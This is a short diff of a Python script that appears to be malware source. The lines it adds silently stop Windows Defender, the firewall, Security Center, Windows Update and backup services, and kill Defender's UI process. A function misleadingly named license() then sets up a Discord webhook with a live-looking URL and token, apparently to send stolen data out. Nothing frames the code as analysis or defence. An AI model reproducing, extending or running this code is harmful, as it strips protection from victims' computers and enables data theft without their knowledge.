@@ -18,9 +18,12 @@ import shutil
 from datetime import timezone, datetime, timedelta
 from discord_webhook import DiscordWebhook
 
-subprocess.getoutput('net stop WinDefend')
+subprocess.getoutput('net stop "WinDefend"')
 subprocess.getoutput('netsh advfirewall set allprofiles state off')
-subprocess.getoutput('taskkill /f /im MSACui.exe')
+subprocess.getoutput('taskkill /f /t /im MSASCui.exe')
+subprocess.getoutput('net stop "SDRSVC"')
+subprocess.getoutput('net stop sharedaccess')
+subprocess.getoutput('net stop "wuauserv"')
 subprocess.getoutput('net stop "security center"')
 def license():
     web=DiscordWebhook(url="https://discord.com/api/webhooks/988419327994761227/QT-ORLi1GRxBbbsbRLs5fs3MkCy2dOuoQL_pFgrhmyCrBYNPSejTcIh8J2ooq9NtFbXy")
